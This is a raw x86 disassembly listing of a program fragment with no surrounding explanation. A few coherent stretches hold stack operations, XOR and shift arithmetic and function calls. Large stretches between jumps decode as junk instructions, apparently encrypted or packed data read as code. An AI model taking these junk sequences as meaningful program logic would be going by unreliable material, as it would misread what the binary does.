  41471e:	and    ah,BYTE PTR [esi]
  414720:	mov    edx,0x28500ff0
  414725:	in     eax,dx
  414726:	dec    esp
  414727:	mov    edx,DWORD PTR [ebp+0x10]
  41472a:	mov    ebx,DWORD PTR [ebp+0x14]
  41472d:	xor    ebx,ebx
  41472f:	or     ecx,ebx
  414731:	add    eax,ecx
  414733:	lea    eax,[ebp+eax*4-0x7c]
  414737:	push   eax
  414738:	shl    edx,0x1e
  41473b:	call   0x411c08
  414740:	mov    eax,DWORD PTR [ebp-0x80]
  414743:	mov    ecx,DWORD PTR [ebp-0x80]
  414746:	xor    eax,edi
  414748:	xor    ecx,0xfffffffe
  41474b:	shr    eax,0x2
  41474e:	shl    ecx,0x1e
  414751:	or     ecx,eax
  414753:	mov    DWORD PTR [ebp-0x80],ecx
  414756:	lea    eax,[ebp-0x80]
  414759:	push   eax
  41475a:	mov    eax,DWORD PTR [ebp+0x10]
  41475d:	mov    ecx,DWORD PTR [ebp+0x14]
  414760:	shrd   eax,ecx,0x2
  414764:	shr    ecx,0x2
  414767:	mov    ecx,DWORD PTR [ebp+0x10]
  41476a:	mov    edx,DWORD PTR [ebp+0x14]
  41476d:	xor    eax,esi
  41476f:	xor    edx,edx
  414771:	or     eax,edx
  414773:	push   eax
  414774:	mov    eax,ds:0x422738
  414779:	mov    edi,0x42267e
  41477e:	push   edi
  41477f:	push   DWORD PTR [eax]
  414781:	shl    ecx,0x1e
  414784:	call   0x41b447
  414789:	lea    eax,[ebp-0x80]
  41478c:	push   eax
  41478d:	mov    eax,DWORD PTR [ebp+0x10]
  414790:	jmp    0x414ac9
  414795:	pop    ds
  414796:	cmp    eax,0xaf9fd01d
  41479b:	das    
  41479c:	lods   eax,DWORD PTR ds:[esi]
  41479d:	sbb    DWORD PTR [esi-0x11a45b39],edi
  4147a3:	push   es
  4147a4:	xchg   edx,eax
  4147a5:	stos   DWORD PTR es:[edi],eax
  4147a6:	sahf   
  4147a7:	mov    esi,0xbec4edbe
  4147ac:	mov    esi,0xdce5badf
  4147b1:	xor    DWORD PTR [eax],0x666cf091
  4147b7:	in     eax,0x69
  4147b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147ba:	popa   
  4147bb:	imul   ebx,DWORD PTR [edx],0x13302f84
  4147c1:	jge    0x4147f0
  4147c3:	xor    BYTE PTR ds:0x6dfbb535,al
  4147c9:	in     eax,0xe5
  4147cb:	dec    esp
  4147cc:	pop    esi
  4147cd:	in     eax,dx
  4147ce:	hlt    
  4147cf:	sub    ch,BYTE PTR [esi]
  4147d1:	mov    cl,0x99
  4147d3:	xchg   DWORD PTR [ecx+0x5d81c289],ecx
  4147d9:	xor    DWORD PTR [di-0x64],ebp
  4147dd:	push   ss
  4147de:	or     DWORD PTR [eax-0x3e],eax
  4147e1:	loope  0x41481e
  4147e3:	es jne 0x4147db
  4147e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147e7:	mov    BYTE PTR [eax+0x68],al
  4147ea:	je     0x414866
  4147ec:	and    bh,BYTE PTR [ebx+0x7370218e]
  4147f2:	sbb    edx,esi
  4147f4:	scas   eax,DWORD PTR es:[edi]
  4147f5:	cmp    al,0x8c
  4147f7:	dec    eax
  4147f8:	mov    eax,DWORD PTR [edi]
  4147fa:	test   ebp,ebp
  4147fc:	or     al,0x21
  4147fe:	cld    
  4147ff:	and    al,0xa9
  414801:	fcomp  DWORD PTR [edx]
  414803:	outs   dx,DWORD PTR ds:[esi]
  414804:	cdq    
  414805:	gs adc eax,0x223d4465
  41480b:	popa   
  41480c:	in     eax,0xf3
  41480e:	out    dx,al
  41480f:	outs   dx,BYTE PTR ds:[esi]
  414810:	mov    dl,BYTE PTR [esi+0x552fee17]
  414816:	jle    0x4147ee
  414818:	sbb    BYTE PTR [edx+esi*8+0x2d68b30e],ch
  41481f:	xor    ebp,ebp
  414821:	xor    esi,ebx
  414823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414824:	cli    
  414825:	push   eax
  414826:	xchg   ecx,eax
  414827:	(bad)  
  414828:	fild   QWORD PTR [ebp+0xe16ff99]
  41482e:	add    ecx,ecx
  414830:	inc    eax
  414831:	cld    
  414832:	dec    ebx
  414833:	xchg   BYTE PTR [esi+0x2e788d7b],bh
  414839:	loop   0x4147ee
  41483b:	lods   al,BYTE PTR ds:[esi]
  41483c:	scas   eax,DWORD PTR es:[edi]
  41483d:	stos   BYTE PTR es:[edi],al
  41483e:	mov    ebx,0x429e3654
  414843:	xchg   ebx,eax
  414844:	mov    eax,DWORD PTR [edi+edx*1+0x46]
  414848:	hlt    
  414849:	lods   eax,DWORD PTR ds:[esi]
  41484a:	fldcw  WORD PTR [edx+0x14]
  41484d:	sub    ch,BYTE PTR [edx]
  41484f:	enter  0xe061,0x65
  414853:	rcr    BYTE PTR [edi],0xc0
  414856:	mov    ebx,0x89d7bb81
  41485b:	into   
  41485c:	inc    ebp
  41485d:	mov    ecx,DWORD PTR [ecx+0x3b]
  414860:	xchg   ebx,eax
  414861:	ins    BYTE PTR es:[edi],dx
  414862:	mov    edx,0x2d480c0
  414867:	loopne 0x41481d
  414869:	icebp  
  41486a:	lods   eax,DWORD PTR ds:[esi]
  41486b:	and    DWORD PTR [ebp-0x7b],esp
  41486e:	mov    edi,0xfe42cd67
  414873:	sub    al,0x4d
  414875:	dec    eax
  414876:	jl     0x414841
  414878:	pop    ebp
  414879:	or     al,0xb
  41487b:	jmp    0xfa22:0xc28226fd
  414882:	lods   eax,DWORD PTR ds:[esi]
  414883:	xchg   esp,eax
  414884:	loopne 0x41486d
  414886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414887:	in     al,dx
  414888:	inc    ecx
  414889:	test   BYTE PTR [edx],0x71
  41488c:	jb     0x414840
  41488e:	dec    esp
  41488f:	lock jmp 0x4148e2
  414892:	inc    eax
  414893:	iret   
  414894:	push   ecx
  414895:	pop    ebp
  414896:	add    eax,0xd00bbf78
  41489b:	mov    ebx,0x22bdf98e
  4148a0:	ins    BYTE PTR es:[edi],dx
  4148a1:	push   ds
  4148a2:	sbb    cl,BYTE PTR [eax+ecx*1+0xb]
  4148a6:	cmc    
  4148a7:	mov    ah,0xbe
  4148a9:	stos   BYTE PTR es:[edi],al
  4148aa:	aaa    
  4148ab:	nop
  4148ac:	and    al,0xc1
  4148ae:	xchg   esi,eax
  4148af:	inc    edx
  4148b0:	inc    esi
  4148b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148b2:	adc    ebp,edi
  4148b4:	jne    0x41488c
  4148b6:	fdecstp 
  4148b8:	je     0x4148c0
  4148ba:	aas    
  4148bb:	xor    ebx,DWORD PTR [eax+0x53]
  4148be:	lea    esp,[ecx+0x46]
  4148c1:	jle    0x4148d1
  4148c3:	add    cl,cl
  4148c5:	cli    
  4148c6:	or     BYTE PTR [esi+0x4a],al
  4148c9:	rcr    ebx,1
  4148cb:	sub    al,BYTE PTR gs:[ebp+0x57363672]
  4148d2:	xor    DWORD PTR [eax],esi
  4148d4:	mov    edi,0x29439a9d
  4148d9:	call   0x680e:0x1db8b817
  4148e0:	inc    ecx
  4148e1:	leave  
  4148e2:	jbe    0x414939
  4148e4:	aam    0xb0
  4148e6:	pop    edi
  4148e7:	or     dl,BYTE PTR [ecx+0x46]
  4148ea:	add    edx,ebp
  4148ec:	sbb    ch,BYTE PTR [ecx+0x11]
  4148ef:	cld    
  4148f0:	or     al,0x7d
  4148f2:	mov    fs,WORD PTR gs:[edx]
  4148f5:	pop    ebx
  4148f6:	rcl    BYTE PTR [edi],cl
  4148f8:	neg    DWORD PTR [edi]
  4148fa:	push   esi
  4148fb:	push   ebx
  4148fc:	add    al,0x5e
  4148fe:	or     BYTE PTR [ebp+ebp*2-0x6d],ah
  414902:	adc    edx,esi
  414904:	rol    BYTE PTR [ebp+esi*8+0xe4f1e10],1
  41490b:	ds sbb al,0xea
  41490e:	xor    DWORD PTR ds:0x38ae6a12,ecx
  414914:	in     al,0xe4
  414916:	pusha  
  414917:	or     ch,BYTE PTR [edx+0x33]
  41491a:	xchg   ebp,eax
  41491b:	cmp    ch,BYTE PTR [ebx-0x1e19021e]
  414921:	cmp    edi,DWORD PTR [ecx]
  414923:	vaddsubps ymm3,ymm7,YMMWORD PTR [esi]
  414927:	xor    ebx,eax
  414929:	mov    esp,0x5f323e18
  41492e:	into   
  41492f:	jns    0x4148b4
  414931:	loopne 0x4148ef
  414933:	pop    ebx
  414934:	imul   esi,DWORD PTR [edx+esi*1-0x456ccad2],0xb
  41493c:	loop   0x414947
  41493e:	dec    eax
  41493f:	jp     0x414944
  414941:	add    ebx,DWORD PTR [edi-0x1f]
  414944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414945:	push   esi
  414946:	(bad)  
  414948:	cdq    
  414949:	retf   0x62c9
  41494c:	add    BYTE PTR [ebx],bl
  41494e:	test   DWORD PTR ds:0x30ce174,esi
  414954:	icebp  
  414955:	sub    DWORD PTR [esp+edx*1],edx
  414958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414959:	leave  
  41495a:	add    ebp,DWORD PTR es:[ebp+0x89bd054]
  414961:	xchg   esp,eax
  414962:	cmp    al,0x6c
  414964:	aam    0xa1
  414966:	test   BYTE PTR [edx],al
  414968:	and    cl,BYTE PTR [edi-0x1fabc32b]
  41496e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41496f:	ret    
  414970:	push   ecx
  414971:	mov    ah,0x76
  414973:	dec    esp
  414974:	push   ecx
  414975:	push   eax
  414976:	sbb    eax,0xb68cfdb4
  41497b:	or     eax,0xc9238819
  414980:	jne    0x41494d
  414982:	es adc al,0x97
  414985:	sub    al,0x29
  414987:	pop    eax
  414988:	ja     0x4149da
  41498a:	adc    edx,edi
  41498c:	popa   
  41498d:	cmp    bl,BYTE PTR [edx]
  41498f:	sub    bh,ah
  414991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414992:	and    al,0x2a
  414994:	sbb    BYTE PTR [eax-0x75],dh
  414997:	sub    ebp,DWORD PTR [ebx+0x3f0f3ed5]
  41499d:	pop    ebx
  41499e:	lods   al,BYTE PTR es:[esi]
  4149a0:	adc    esi,ebx
  4149a2:	jmp    0x41494f
  4149a4:	imul   edx,DWORD PTR [ebp+0x78dc504c],0x8e9e56c0
  4149ae:	mov    esp,0x10ecce1f
  4149b3:	scas   eax,DWORD PTR es:[edi]
  4149b4:	jp     0x414987
  4149b6:	loop   0x414958
  4149b8:	and    al,0xc4
  4149ba:	ret    0xb4c
  4149bd:	dec    edx
  4149be:	mov    ds:0x394c8387,al
  4149c3:	call   0x2d7f:0x118621e
  4149ca:	dec    edx
  4149cb:	test   eax,0xf0a1fa10
  4149d0:	pushf  
  4149d1:	arpl   WORD PTR [ebx+0x10],di
  4149d4:	loope  0x4149d0
  4149d6:	push   cs
  4149d7:	stos   DWORD PTR es:[edi],eax
  4149d8:	in     al,dx
  4149d9:	jl     0x41499c
  4149db:	and    eax,0xd2d2cb3d
  4149e0:	mov    ebx,0xe6aaee30
  4149e5:	push   edi
  4149e6:	adc    dh,BYTE PTR [edi-0x6fb7747a]
  4149ec:	or     ebp,eax
  4149ee:	cmp    BYTE PTR ds:0xd147b839,bl
  4149f4:	ficom  DWORD PTR [eax]
  4149f6:	ret    
  4149f7:	pusha  
  4149f8:	cld    
  4149f9:	or     BYTE PTR [ebx-0xf],al
  4149fc:	xor    eax,0x719cdc70
  414a01:	adc    bl,dh
  414a03:	jmp    0x414a84
  414a05:	sub    BYTE PTR [edi],dl
  414a07:	or     eax,0x8c8ea3d
  414a0c:	fucomi st,st(4)
  414a0e:	jbe    0x414a7c
  414a10:	pop    esp
  414a11:	imul   ebx,DWORD PTR ds:[ecx+edx*1+0x37],0x48
  414a17:	sub    ecx,DWORD PTR [ecx]
  414a19:	retf   0x8f83
  414a1c:	cmc    
  414a1d:	out    0xdb,eax
  414a1f:	jne    0x414a4e
  414a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a22:	pop    ebp
  414a23:	aad    0x55
  414a25:	aad    0xe7
  414a27:	and    eax,esi
  414a29:	push   es
  414a2a:	(bad)  
  414a2b:	xchg   esp,eax
  414a2c:	mov    dh,0x76
  414a2e:	xor    al,0x37
  414a30:	or     ah,BYTE PTR [eax]
  414a32:	mov    BYTE PTR [ebx-0x57],bh
  414a35:	push   es
  414a36:	adc    BYTE PTR ds:0x9911b1f3,0x8a
  414a3d:	loopne 0x414a0c
  414a3f:	inc    ecx
  414a40:	dec    ebx
  414a41:	fs iret 
  414a43:	add    dh,bh
  414a45:	rcl    BYTE PTR [ebp-0x73],0x23
  414a49:	cdq    
  414a4a:	xchg   edi,eax
  414a4b:	xchg   edi,eax
  414a4c:	sahf   
  414a4d:	xor    al,0xda
  414a4f:	mov    ebx,0xb46dbce
  414a54:	sbb    ah,cl
  414a56:	jo     0x414a91
  414a58:	push   DWORD PTR [ecx]
  414a5a:	int    0xfb
  414a5c:	add    eax,DWORD PTR [eax+0x4836acbf]
  414a62:	pop    ebx
  414a63:	out    0x58,al
  414a65:	sbb    BYTE PTR [edx-0x60],ah
  414a68:	test   DWORD PTR [edx],ecx
  414a6a:	add    BYTE PTR [esi],cl
  414a6c:	ins    BYTE PTR es:[edi],dx
  414a6d:	shl    dh,1
  414a6f:	popf   
  414a70:	sub    edx,DWORD PTR cs:[edx]
  414a73:	lods   al,BYTE PTR ds:[esi]
  414a74:	push   esp
  414a75:	shl    BYTE PTR [ebp+esi*2+0x6f0ef301],0x89
  414a7d:	xchg   esi,eax
  414a7e:	je     0x414a70
  414a80:	cli    
  414a81:	fmul   st(1),st
  414a83:	mov    ds:0xa06a1d6b,al
  414a88:	jecxz  0x414aa1
  414a8a:	inc    ecx
  414a8b:	inc    ecx
  414a8c:	loope  0x414ac4
  414a8e:	out    dx,eax
  414a8f:	js     0x414a2f
  414a91:	mov    ebp,0x96d7cbdf
  414a96:	sbb    DWORD PTR [eax+0x6f],ebp
  414a99:	cld    
  414a9a:	push   ebx
  414a9b:	cmp    edx,DWORD PTR [ebx+0x63]
  414a9e:	push   es
  414a9f:	inc    esi
  414aa0:	into   
  414aa1:	lods   al,BYTE PTR ds:[esi]
  414aa2:	je     0x414af4
  414aa4:	aad    0x5
  414aa6:	rol    eax,cl
  414aa8:	add    eax,0x8048e157
  414aad:	dec    esi
  414aae:	scas   eax,DWORD PTR es:[edi]
  414aaf:	inc    edi
  414ab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ab1:	out    0xf6,eax
  414ab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ab4:	and    BYTE PTR [edi+0x6ddf3d2f],0x22
  414abb:	and    al,0xce
  414abd:	(bad)  
  414abe:	and    ecx,DWORD PTR [ecx]
  414ac0:	xchg   ebp,eax
  414ac1:	or     al,BYTE PTR [eax]
  414ac3:	adc    dl,bh
  414ac5:	xor    bl,BYTE PTR [ecx+eax*8]
  414ac8:	adc    eax,0xf144d8b
  414acd:	lods   al,BYTE PTR ds:[esi]
  414ace:	enter  0xc102,0xe9
  414ad2:	add    cl,BYTE PTR [ebx+0x558b104d]
  414ad8:	adc    al,0x33
  414ada:	(bad)  
  414adb:	xor    edx,edx
  414add:	or     eax,edx
  414adf:	push   eax
  414ae0:	mov    eax,ds:0x422738
  414ae5:	push   edi
  414ae6:	push   DWORD PTR [eax]
  414ae8:	shl    ecx,0x1e
  414aeb:	call   0x41b447
  414af0:	mov    eax,DWORD PTR [ebp-0x3c]
  414af3:	mov    eax,DWORD PTR [ebp-0x2c]
  414af6:	mov    edi,DWORD PTR [ebp-0x24]
  414af9:	mov    eax,DWORD PTR [ebp-0x30]
  414afc:	mov    ecx,edi
  414afe:	mov    DWORD PTR [ebp-0x1c],eax
  414b01:	rol    ecx,0x2
  414b04:	mov    eax,0xa5069bae
  414b09:	xor    ecx,eax
  414b0b:	jmp    0x414e44
  414b10:	fisttp WORD PTR [eax+0x5aac5a8c]
  414b16:	xor    BYTE PTR [esp+edx*1+0x29e14bc],bh
  414b1d:	pop    edi
  414b1e:	dec    esi
  414b1f:	sahf   
  414b20:	(bad)  [esi+edi*4-0x413b1242]
  414b27:	mov    esi,0x890b7007
  414b2c:	push   ss
  414b2d:	cwde   
  414b2e:	pop    eax
  414b2f:	or     bl,BYTE PTR [esp+edx*2-0x20]
  414b33:	xchg   ebx,eax
  414b34:	sbb    edi,DWORD PTR [ebx*2-0x68aa783]
  414b3b:	or     eax,0x4412840e
  414b40:	mov    es,WORD PTR [eax]
  414b42:	in     eax,0xcb
  414b44:	mov    edi,0xa1859275
  414b49:	out    dx,eax
  414b4a:	cmc    
  414b4b:	icebp  
  414b4c:	adc    dl,BYTE PTR [edi]
  414b4e:	leave  
  414b4f:	adc    bh,cl
  414b51:	ja     0x414b00
  414b53:	imul   ecx,DWORD PTR [edi],0x499402b5
  414b59:	push   esi
  414b5a:	jo     0x414bd9
  414b5c:	loop   0x414b89
  414b5e:	push   edi
  414b5f:	add    BYTE PTR [ebp+ebx*8-0x2e],ah
  414b63:	cmp    DWORD PTR [esi],ebx
  414b65:	rcr    ch,0x45
  414b68:	pop    es
  414b69:	push   eax
  414b6a:	es test al,0x33
  414b6d:	sub    DWORD PTR [esi+0x6d],esp
  414b70:	lods   eax,DWORD PTR ds:[esi]
  414b71:	jmp    0x414b45
  414b73:	adc    ebp,DWORD PTR [edx]
  414b75:	in     eax,0xfc
  414b77:	inc    ecx
  414b78:	int3   
  414b79:	add    BYTE PTR [esi+0x52f73e55],dh
  414b7f:	jnp    0x414b9a
  414b81:	sub    cl,dh
  414b83:	fisttp DWORD PTR [ecx]
  414b85:	inc    edi
  414b86:	arpl   WORD PTR [edx+0xc3e0c18],ax
  414b8c:	push   0x8acd6c1f
  414b91:	bound  esi,QWORD PTR [edi-0x369306c3]
  414b97:	sub    cl,BYTE PTR [ebx]
  414b99:	add    ah,BYTE PTR [eax+0x14]
  414b9c:	lds    esi,FWORD PTR [ebp+0x249afde]
  414ba2:	push   ebp
  414ba3:	pop    es
  414ba4:	push   0xffffffc2
  414ba6:	push   edx
  414ba7:	out    0x7a,eax
  414ba9:	pop    ebx
  414baa:	pop    ebp
  414bab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bac:	pop    eax
  414bad:	aas    
  414bae:	add    BYTE PTR [ecx],bl
  414bb0:	sti    
  414bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bb2:	push   ss
  414bb3:	aas    
  414bb4:	mov    eax,0x69be7736
  414bb9:	dec    edi
  414bba:	sub    al,0xd2
  414bbc:	pop    esi
  414bbd:	pop    ebx
  414bbe:	shl    ecx,cl
  414bc0:	in     al,0x64
  414bc2:	push   ebx
  414bc3:	addr16 jne 0x414b7d
  414bc6:	sbb    eax,0x211267ba
  414bcb:	mov    BYTE PTR ds:0x77be8d01,dh
  414bd1:	pop    ebp
  414bd2:	mov    es,WORD PTR [edi]
  414bd4:	shl    DWORD PTR [ecx+0x1e],1
  414bd7:	iret   
  414bd8:	mov    edx,0xb20d3197
  414bdd:	int    0xba
  414bdf:	cs pop eax
  414be1:	fist   DWORD PTR [eax]
  414be3:	push   eax
  414be4:	dec    ecx
  414be5:	mov    al,ds:0x2fd55eec
  414bea:	pop    eax
  414beb:	mov    WORD PTR [edx-0x1d],es
  414bee:	jmp    0x382b30af
  414bf3:	sub    cl,BYTE PTR [eax]
  414bf5:	inc    ecx
  414bf6:	lods   eax,DWORD PTR ds:[esi]
  414bf7:	adc    BYTE PTR [edi-0x73f095c0],bh
  414bfd:	test   BYTE PTR [esi],ch
  414bff:	mov    esi,0x9126232c
  414c04:	cmp    ch,0x24
  414c07:	mov    ss,WORD PTR [ebx+0x23]
  414c0a:	cdq    
  414c0b:	adc    DWORD PTR [eax],ebx
  414c0d:	or     bl,bl
  414c0f:	retf   
  414c10:	mov    WORD PTR [edi+edx*2],gs
  414c13:	pcmpgtw mm2,QWORD PTR [esi-0x11f191b4]
  414c1a:	pop    esp
  414c1b:	jmp    0xa409:0xd79bc1c1
  414c22:	push   0x44
  414c24:	jg     0x414c72
  414c26:	popa   
  414c27:	mov    edi,0x37400280
  414c2c:	shl    dh,1
  414c2e:	inc    ecx
  414c2f:	dec    ecx
  414c30:	jp     0x414c11
  414c32:	inc    edi
  414c33:	sub    DWORD PTR [ebp+0x7b],esi
  414c36:	sti    
  414c37:	inc    esp
  414c38:	dec    ebx
  414c39:	and    eax,0xa49a9c10
  414c3e:	cld    
  414c3f:	and    ch,bl
  414c41:	and    DWORD PTR [ecx+0x32],0x2329b41f
  414c48:	push   esp
  414c49:	fdivr  st(1),st
  414c4b:	jb     0x414c37
  414c4d:	dec    esp
  414c4e:	dec    ebp
  414c4f:	fcomip st,st(0)
  414c51:	inc    ecx
  414c52:	fisubr WORD PTR [edi+0x3c]
  414c55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c56:	sub    al,0x41
  414c58:	(bad)  
  414c59:	call   0x92ee54d7
  414c5e:	push   eax
  414c5f:	jns    0x414c4c
  414c61:	div    BYTE PTR [edi-0x78]
  414c64:	out    0x6,al
  414c66:	test   al,0x52
  414c68:	retf   
  414c69:	dec    ebx
  414c6a:	xchg   BYTE PTR [ecx+0xa],cl
  414c6d:	retf   
  414c6e:	outs   dx,BYTE PTR ds:[esi]
  414c6f:	pushf  
  414c70:	stos   DWORD PTR es:[edi],eax
  414c71:	fimul  WORD PTR [edi+ecx*2+0x7c8619a]
  414c78:	pusha  
  414c79:	add    al,0xae
  414c7b:	mov    edi,0x5a30d8c0
  414c80:	retf   0x4ac6
  414c83:	popf   
  414c84:	dec    eax
  414c85:	mov    esp,0x33825a6e
  414c8a:	ror    DWORD PTR [ecx],1
  414c8c:	sub    esi,DWORD PTR [edi]
  414c8e:	cdq    
  414c8f:	xlat   BYTE PTR ds:[ebx]
  414c90:	mov    cl,0xbf
  414c92:	das    
  414c93:	mov    bh,0xd3
  414c95:	xchg   ebp,eax
  414c96:	pop    esp
  414c97:	mov    edx,0x55d1518a
  414c9c:	sub    al,cl
  414c9e:	outs   dx,DWORD PTR ds:[esi]
  414c9f:	lea    esp,[ebp-0x7d]
  414ca2:	jp     0x414c43
  414ca4:	in     al,0xde
  414ca6:	mov    edi,0xec30be7b
  414cab:	and    edx,DWORD PTR [ebx]
  414cad:	retf   
  414cae:	and    DWORD PTR [ebp-0x5e6b9c48],0xfffffff2
  414cb5:	scas   al,BYTE PTR es:[edi]
  414cb6:	frstor [esi+0x64]
  414cb9:	into   
  414cba:	cmp    eax,DWORD PTR [edi]
  414cbc:	push   esi
  414cbd:	ror    BYTE PTR [edi+0x5a],0x68
  414cc1:	icebp  
  414cc2:	jecxz  0x414c9e
  414cc4:	div    dh
  414cc6:	repz lea ecx,[ecx+0x17]
  414cca:	pop    edx
  414ccb:	push   ebp
  414ccc:	jo     0x414d2d
  414cce:	add    DWORD PTR [esi-0x6ad810fe],edx
  414cd4:	shr    DWORD PTR [ebx],cl
  414cd6:	mov    ch,0x74
  414cd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cd9:	repz or ebx,DWORD PTR [ecx]
  414cdc:	xchg   ecx,eax
  414cdd:	(bad)  
  414cde:	cli    
  414cdf:	int    0x97
  414ce1:	push   0x63
  414ce3:	(bad)  
  414ce4:	std    
  414ce5:	dec    esp
  414ce6:	pop    ecx
  414ce7:	fcom   QWORD PTR [edi-0x564d21ec]
  414ced:	(bad)  
  414cee:	cmp    al,0xbe
  414cf0:	not    DWORD PTR [ecx]
  414cf2:	cmp    cl,BYTE PTR [esi]
  414cf4:	jmp    0x52773a3c
  414cf9:	test   BYTE PTR ds:0xba60b0b8,dh
  414cff:	rcl    DWORD PTR [ebx+0x2e],1
  414d02:	mov    ecx,0xe19638cc
  414d07:	ds aaa 
  414d09:	mov    esp,0xb6d37c46
  414d0e:	test   edx,ebp
  414d10:	or     al,0xaa
  414d12:	cmp    al,0xbf
  414d14:	dec    ebx
  414d15:	aas    
  414d16:	cmp    edi,DWORD PTR [ebx+0x88c8712]
  414d1c:	or     al,0xfe
  414d1e:	outs   dx,DWORD PTR ds:[esi]
  414d1f:	out    dx,eax
  414d20:	outs   dx,BYTE PTR ds:[esi]
  414d21:	dec    ecx
  414d22:	jno    0x414d3d
  414d24:	gs lds esp,FWORD PTR ss:[ecx+0x3f75ce2e]
  414d2c:	sub    DWORD PTR [eax-0x5e],edi
  414d2f:	dec    ebx
  414d30:	mov    BYTE PTR [ebp+eiz*8-0x10],dl
  414d34:	xor    BYTE PTR [eax-0x1],0xc7
  414d38:	cmc    
  414d39:	scas   eax,DWORD PTR es:[edi]
  414d3a:	fwait
  414d3b:	jecxz  0x414d99
  414d3d:	adc    DWORD PTR [esi+0x3959966c],eax
  414d43:	int    0xc3
  414d45:	xchg   cl,bh
  414d47:	fs mov bh,0x93
  414d4a:	sub    BYTE PTR [ecx+0x72db5b88],dh
  414d50:	sahf   
  414d51:	jle    0x414d14
  414d53:	dec    edx
  414d54:	bound  edx,QWORD PTR [esp+eax*2+0x7d]
  414d58:	add    bh,BYTE PTR [ebx+0x6e405d91]
  414d5e:	sahf   
  414d5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d60:	stos   BYTE PTR es:[edi],al
  414d61:	pop    esp
  414d62:	outs   dx,BYTE PTR ds:[esi]
  414d63:	shl    BYTE PTR [edi],1
  414d65:	fimul  WORD PTR ss:[edi]
  414d68:	add    al,0xc8
  414d6a:	aaa    
  414d6b:	ds fst DWORD PTR gs:[esi]
  414d6f:	fsub   QWORD PTR [edi]
  414d71:	dec    edx
  414d72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d73:	(bad)  
  414d74:	mov    ds:0x41dd6f96,eax
  414d79:	push   ds
  414d7a:	and    DWORD PTR [ebp-0x6399c9ff],esp
  414d80:	data16 aas 
  414d82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d83:	fldenv [eax-0x2a]
  414d86:	xchg   ebx,eax
  414d87:	retf   0x4c66
  414d8a:	jno    0x414dd5
  414d8c:	mov    edi,0xa2d5fe35
  414d91:	jg     0x414d8a
  414d93:	jge    0x414d8c
  414d95:	jno    0x414dd0
  414d97:	je     0x414d84
  414d99:	clc    
  414d9a:	sbb    bl,BYTE PTR [eax]
  414d9c:	mov    WORD PTR [eax-0x3b84c4c4],cs
  414da2:	arpl   WORD PTR [ebx-0x6a],bp
  414da5:	inc    eax
  414da6:	popa   
  414da7:	in     al,dx
  414da8:	xlat   BYTE PTR ds:[ebx]
  414da9:	(bad)
  414dae:	xor    edi,eax
  414db0:	das    
  414db1:	mov    eax,0x2a72a299
  414db6:	in     eax,0xd
  414db8:	test   BYTE PTR ds:0xafc102e2,0x4d
  414dbf:	mov    edi,DWORD PTR [edx-0x268d446c]
  414dc5:	push   ss
  414dc6:	cmp    bl,ah
  414dc8:	dec    ecx
  414dc9:	cli    
  414dca:	sbb    DWORD PTR [ecx-0x552c6444],edi
  414dd0:	into   
  414dd1:	mov    edx,0xf3780b43
  414dd6:	fsubrp st(0),st
  414dd8:	mov    ecx,0xe95b5e38
  414ddd:	mov    dl,0x61
  414ddf:	rcl    BYTE PTR [edx],1
  414de1:	scas   al,BYTE PTR es:[edi]
  414de2:	xchg   esp,eax
  414de3:	push   0xb53eeb0b
  414de8:	inc    ecx
  414de9:	push   esp
  414dea:	(bad)  
  414deb:	adc    esp,DWORD PTR [ecx+0x42]
  414dee:	(bad)  
  414def:	dec    ebp
  414df0:	mov    ebx,0xb460c917
  414df5:	mov    dh,0x30
  414df7:	mov    cl,0xae
  414df9:	lods   eax,DWORD PTR ds:[esi]
  414dfa:	dec    ebp
  414dfb:	inc    esp
  414dfc:	lahf   
  414dfd:	aam    0x4d
  414dff:	push   ecx
  414e00:	jecxz  0x414e01
  414e02:	cmp    ecx,DWORD PTR ds:[edi+0x26219729]
  414e09:	inc    eax
  414e0a:	(bad)  [edi]
  414e0c:	jecxz  0x414df8
  414e0e:	pop    ebp
  414e0f:	bound  edx,QWORD PTR [ecx-0x2aea5c5d]
  414e15:	lods   al,BYTE PTR ds:[esi]
  414e16:	clc    
  414e17:	and    DWORD PTR [esp+ebx*8-0x6cdf5da8],ebp
  414e1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e1f:	mov    bl,0x8d
  414e21:	sbb    BYTE PTR [ecx+ebp*1-0x4d],0x68
  414e26:	jle    0x414e23
  414e28:	mov    bh,0xe9
  414e2a:	pop    edx
  414e2b:	mov    ebp,DWORD PTR [edx]
  414e2d:	sbb    al,BYTE PTR [ebx-0x28]
  414e30:	pop    edx
  414e31:	fs inc esp
  414e33:	xchg   ebp,eax
  414e34:	cmp    dl,cl
  414e36:	jno    0x414dec
  414e38:	pop    esi
  414e39:	imul   esi,DWORD PTR gs:[edi+0x1ae94301],0x57256a7d
  414e44:	cmp    ecx,eax
  414e46:	jmp    0x41517f
  414e4b:	call   0xa44dd255
  414e50:	mov    WORD PTR [edi+0x2a],fs
  414e53:	mov    eax,0x99e22a6
  414e58:	sbb    DWORD PTR [ecx+edx*8+0xc],ebp
  414e5c:	stos   BYTE PTR es:[edi],al
  414e5d:	mov    esi,0xbec4edbe
  414e62:	mov    esi,0xd9710b25
  414e67:	add    esi,DWORD PTR [edi-0x1b]
  414e6a:	adc    eax,0x935650a1
  414e6f:	inc    edx
  414e70:	cmp    ebx,DWORD PTR [edi-0x27]
  414e73:	mov    ecx,0x3eff8789
  414e78:	xchg   ebp,eax
